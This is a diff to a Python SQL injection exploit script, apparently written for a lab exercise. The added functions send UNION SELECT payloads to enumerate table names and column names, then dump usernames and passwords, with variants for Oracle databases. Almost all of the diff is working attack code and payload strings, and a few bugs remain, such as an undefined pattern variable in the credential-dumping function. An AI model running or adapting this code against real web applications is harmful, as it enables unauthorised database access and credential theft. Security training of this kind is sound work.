@@ -1,10 +1,10 @@
+import re
 import sys
 import urllib.parse
 
 import requests
 import urllib3
 from colorama import Fore
-import re
 
 urllib3.disable_warnings()
 
@@ -110,20 +110,76 @@ def exploit_sqli(base_url):
 
     return 0
 
-def find_tables_name(base_url: str, isOra: bool, number_table):
-    base_queries = ["' UNION SELECT NULL, table_name FROM information_schema.tables --", "' UNION SELECT * FROM all_tables --"]
+
+def find_tables_name(base_url: str, isOra: bool, num_of_col):
+    variation = ["NULL"] * num_of_col
+    variation[num_of_col - 1] = "table_name"
+    str_variation = ", ".join(variation)
+    base_queries = [
+        f"' UNION SELECT {str_variation} FROM information_schema.tables --",
+        f"' UNION SELECT {str_variation} FROM all_tables --",
+    ]
     base_querie = base_queries[1] if isOra else base_queries[0]
-    r = requests.get(
-        base_url + base_querie, proxies=proxies, verify=False, timeout=5
-    )
+    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)
 
     r.raise_for_status()
     print(base_url + base_querie)
     response_content = r.text
-    pattern = r'users_\w+'
+    pattern = r"users_\w+"
     matches = re.findall(pattern, response_content)
     for match in matches:
         print(f"{Fore.YELLOW}{match}{Fore.RESET}")
+    find_columns_name(base_url, isOra, num_of_col, matches[0])
+
+    return False
+
+def find_columns_name(base_url: str, isOra: bool, num_of_col: int, table_name:str):
+    variation = ["NULL"] * num_of_col
+    variation[num_of_col - 1] = "column_name"
+    str_variation = ", ".join(variation)
+    base_queries = [
+        f"' UNION SELECT {str_variation} FROM information_schema.columns WHERE table_name = '{table_name}' --",
+        f"' UNION SELECT {str_variation} FROM all_tab_columns WHERE table_name = '{table_name}' --",
+    ]
+    base_querie = base_queries[1] if isOra else base_queries[0]
+    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)
+
+    r.raise_for_status()
+    print(base_url + base_querie)
+    response_content = r.text
+    pattern = r"(username|password)_\w+"
+    matches = re.findall(pattern, response_content)
+    for match in matches:
+        print(f"{Fore.YELLOW}{match}{Fore.RESET}")
+    a = input("Do you want to find username, password? [y/n]:")
+    if a == 'y':
+        find_all_users(base_url, isOra, num_of_col, matches[0])
+
+    return False
+
+def find_all_users(base_url: str, isOra: bool, num_of_col: int, column_name:str):
+    if (num_of_col) < 2:
+        return False
+    variation = ["NULL"] * num_of_col
+    variation[num_of_col - 2] = "username"
+    variation[num_of_col - 1] = "password"
+    str_variation = ", ".join(variation)
+    base_queries = [
+        f"' UNION SELECT {str_variation} FROM {column_name}--",
+        f"' UNION SELECT {str_variation} FROM {column_name}--",
+    ]
+    base_querie = base_queries[1] if isOra else base_queries[0]
+    print(base_querie)
+    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)
+
+    r.raise_for_status()
+    print(base_url + base_querie)
+    response_content = r.text
+    
+    matches = re.findall(pattern, response_content)
+    for match in matches:
+        print(f"{Fore.YELLOW}{match}{Fore.RESET}")
+        
 
     return False
 
@@ -141,11 +197,11 @@ if __name__ == "__main__":
     if number_of_columns <= 0:
         print("[-] Exploit failed")
     answer = input("Do you want to look for table names? [y/n]: ")
-    if answer == 'n':
+    if answer == "n":
         sys.exit(0)
     answer = input("Is it an Oracle DataBase? [y/n]: ")
     isOracle = False
-    if answer == 'y':
+    if answer == "y":
         isOracle = True
     find_tables_name(url, isOracle, NUMBER_OF_COLUMN)
-
+    
